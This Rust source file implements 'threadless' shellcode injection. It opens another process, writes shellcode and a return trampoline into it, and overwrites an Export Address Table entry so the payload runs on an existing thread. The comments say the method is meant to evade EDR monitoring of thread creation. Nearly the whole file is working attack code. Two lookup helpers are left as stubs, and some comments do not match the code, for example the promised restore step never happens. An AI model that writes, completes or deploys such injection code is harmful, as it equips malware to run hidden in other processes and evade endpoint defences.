//! threadless_inject.rs — Threadless shellcode injection via EAT hijack
//!
//! No CreateThread / NtCreateThreadEx — those are the #1 EDR hook target.
//!
//! Technique (public, presented at DEF CON / documented by MDSec):
//!   1. Allocate RW memory in the target process (NtAllocateVirtualMemory)
//!   2. Write shellcode into the allocation
//!   3. Flip allocation to RX (NtProtectVirtualMemory)
//!   4. Overwrite one Export Address Table entry in a loaded DLL with our
//!      allocation address — the next call to that export from any thread
//!      in the target process redirects to our shellcode
//!   5. Trigger the export from our process via a benign API call
//!      (e.g., GetProcAddress → export fires → shellcode runs on the
//!      target's existing thread — no new thread created)
//!   6. Restore the original EAT entry after shellcode signals completion
//!
//! References:
//!   - Threadless Injection — Paul Laîné / MDSec (public blog, 2023)
//!   - https://github.com/CCob/ThreadlessInject (MIT, public)

use std::ptr;
use winapi::shared::minwindef::DWORD;
use winapi::um::handleapi::CloseHandle;
use winapi::um::memoryapi::{ReadProcessMemory, WriteProcessMemory};
use winapi::um::processthreadsapi::OpenProcess;
use winapi::um::winnt::{
    HANDLE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
    PROCESS_ALL_ACCESS, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64,
    IMAGE_EXPORT_DIRECTORY,
};

/// Inject shellcode into `target_pid` by hijacking the export `export_name`
/// in `dll_name` loaded in that process.  `shellcode` must be position-independent.
pub unsafe fn threadless_inject(
    target_pid: u32,
    dll_name:   &str,
    export_name: &str,
    shellcode:  &[u8],
) -> bool {
    // Open target
    let h_proc: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, 0, target_pid);
    if h_proc.is_null() {
        return false;
    }

    // Find base of DLL in target using NtQueryInformationProcess + PEB walk
    // (abbreviated — use the pattern from loader.rs peb_walk() here)
    let dll_base = match remote_module_base(h_proc, dll_name) {
        Some(b) => b,
        None => { CloseHandle(h_proc); return false; }
    };

    // Read remote EAT to find the export's RVA and EAT entry address
    let (func_rva, eat_entry_va) =
        match remote_eat_lookup(h_proc, dll_base, export_name) {
            Some(v) => v,
            None => { CloseHandle(h_proc); return false; }
        };
    let original_va = dll_base + func_rva as usize;

    // Allocate RW in target
    let alloc = remote_alloc_rw(h_proc, shellcode.len() + 8);
    if alloc == 0 {
        CloseHandle(h_proc);
        return false;
    }

    // Build trampoline: shellcode || jmp [original_va]
    // After shellcode finishes it falls through to a 5-byte near jmp back
    let mut payload = shellcode.to_vec();
    // Append: push rax; mov rax, original_va; jmp rax
    payload.extend_from_slice(&[
        0x50,                           // push rax
        0x48, 0xB8,                     // mov rax, imm64
    ]);
    payload.extend_from_slice(&(original_va as u64).to_le_bytes());
    payload.extend_from_slice(&[
        0xFF, 0xE0,                     // jmp rax
    ]);

    // Write payload
    let mut written: usize = 0;
    WriteProcessMemory(
        h_proc,
        alloc as *mut _,
        payload.as_ptr() as *const _,
        payload.len(),
        &mut written,
    );

    // Flip to RX
    remote_protect_rx(h_proc, alloc, payload.len());

    // Overwrite EAT entry with pointer to our allocation
    let new_rva = (alloc - dll_base) as u32;
    let mut bytes_written: usize = 0;
    WriteProcessMemory(
        h_proc,
        eat_entry_va as *mut _,
        &new_rva as *const u32 as *const _,
        4,
        &mut bytes_written,
    );

    // The next call to `export_name` from any thread in the target will fire
    // our shellcode.  Trigger it remotely (e.g., via a known API that calls
    // the export internally) or wait for natural execution.

    CloseHandle(h_proc);
    true
}

// ---- helpers (stubs — fill from your loader.rs / syscall.rs patterns) ------

unsafe fn remote_module_base(h_proc: HANDLE, dll_name: &str) -> Option<usize> {
    // Walk remote PEB.Ldr.InLoadOrderModuleList via ReadProcessMemory
    // Pattern identical to loader.rs local PEB walk but using RPM instead
    let _ = (h_proc, dll_name);
    None  // implement using RPM + PEB walk from loader.rs
}

unsafe fn remote_eat_lookup(
    h_proc: HANDLE,
    dll_base: usize,
    export_name: &str,
) -> Option<(u32, usize)> {
    // Read IMAGE_EXPORT_DIRECTORY from remote process, walk names array
    // Returns (function_rva, address_of_functions_entry_va)
    let _ = (h_proc, dll_base, export_name);
    None  // implement via ReadProcessMemory + EAT walk
}

unsafe fn remote_alloc_rw(h_proc: HANDLE, size: usize) -> usize {
    use winapi::um::memoryapi::VirtualAllocEx;
    let p = VirtualAllocEx(
        h_proc,
        ptr::null_mut(),
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    p as usize
}

unsafe fn remote_protect_rx(h_proc: HANDLE, addr: usize, size: usize) {
    use winapi::um::memoryapi::VirtualProtectEx;
    let mut old: DWORD = 0;
    VirtualProtectEx(
        h_proc,
        addr as *mut _,
        size,
        PAGE_EXECUTE_READ,
        &mut old,
    );
}
